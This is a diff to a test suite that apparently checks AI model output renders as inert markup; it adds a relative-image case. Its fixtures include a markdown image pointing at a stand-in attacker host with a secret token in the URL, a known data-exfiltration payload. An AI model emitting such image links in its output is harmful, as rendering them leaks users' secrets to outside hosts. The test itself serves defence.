@@ -86,6 +86,7 @@ describe("model output renders as inert markup", () => {
 		"a fenced code language dressing the block": "```fixed inset-0\ncode\n```",
 		"a remote markdown image":
 			"![secret](https://attacker.example/leak.png?token=SECRET)",
+		"a relative markdown image": "![events](/ai/channel/events)",
 		"a data image": "![x](data:image/png;base64,iVBORw0KGgo=)",
 		"a table alignment": "| a |\n|:-:|\n| b |",
 	};
